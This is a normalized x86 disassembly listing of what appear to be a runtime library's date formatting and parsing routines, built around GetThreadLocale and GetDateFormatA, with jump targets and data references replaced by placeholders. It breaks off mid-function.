mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408778
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409748
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4097f8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409824
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_4096ec
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_40985c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409440
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_40989c
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4099ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403e9c
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f34
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40435c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4099f1
lea eax [ ebp - 0x118 ]
call sub_403e9c
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_40410c
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_40415c
mov edx eax
mov eax [ ebx ]
call sub_40be5c
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40bfd0
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_4043bc
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40bf6c
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404094
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40bfd0
mov ecx eax
mov eax ebx
mov edx esi
call sub_403f8c
sub_409a04
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409ae2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403e9c
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f34
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f34
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409ae9
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_40410c
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40435c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_40415c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4043bc
sub_409b0c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a28d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a294
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403ec0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c050
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c030
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409748
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c050
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409748
pop ecx
mov al [ eax + lookup_table_409bef ]
jmp [ eax * 4 + jump_table_409c28 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_409824
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_409824
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_40989c
pop ecx
mov eax [ ebp - 0x24 ]
call sub_40978c
pop ecx
jmp r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_409824
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409a04
pop ecx
mov eax [ ebp - 0x28 ]
call sub_40978c
pop ecx
jmp r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_409824
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_4097f8
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_40985c
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_40985c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_40985c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_4097f8
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_40985c
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_40985c
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4085e8
test eax eax
jne r-xdata
push ebp
call sub_4097f8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b0c
pop ecx
push ebp
call sub_40985c
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_4097ac
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_4097ac
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4097ac
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409824
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_4097ac
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_4097ac
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_4097ac
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b0c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b0c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4097ac
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4085e8
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409748
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b0c
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409748
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409748
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40978c
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40970c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40978c
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4085e8
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409748
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409748
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40978c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40970c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40978c
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c050
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4085e8
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409748
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b0c
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_4097ac
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4085e8
test eax eax
jne r-xdata
push ebp
call sub_409824
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40970c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40978c
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40978c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40978c
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c050
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b0c
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409748
pop ecx
jmp r-xdata
push ebp
call sub_409824
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40970c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40978c
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4085e8
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4085e8
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4085e8
test eax eax
jne r-xdata
jmp r-xdata
sub_40a2c0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409b0c
pop ecx
push ebp
mov eax ebx
call sub_409b0c
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_403f8c
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a330
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_40415c
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a354
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a330
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_40415c
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a3e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a461
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a468
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a330
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_40415c
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4043bc
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407d30
test eax eax
jne r-xdata
mov eax edi
call sub_40415c
add [ esi ] eax
mov bl 0x1
sub_40a474
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a330
mov eax esi
call sub_40415c
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a4ac
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_40415c
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a4f8
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_40415c
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c094
mov [ ebx ] eax
jmp r-xdata
sub_40a540
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40435c
push eax
mov eax [ ebx ]
call sub_40435c
pop edx
call sub_40c108
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a594
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409734
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a5f0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a90b
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a4ac
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c0d0
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a354
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a4f8
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_4043bc
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407da0
mov eax [ ebp - 0x1c ]
call sub_40a540
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a912
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403ec0
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a474
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a354
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a474
test al al
je r-xdata
call sub_409734
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a354
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_4094d8
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_4044a0
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a474
mov edx ebx
mov eax esi
call sub_40a330
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_40415c
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a4f8
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a594
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a330
mov eax esi
call sub_40415c
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409734
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_40415c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4043bc
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407d30
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_40415c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4043bc
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407d30
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40a934
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a3e8
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a3e8
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a3e8
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a354
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a330
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a3e8
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a474
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
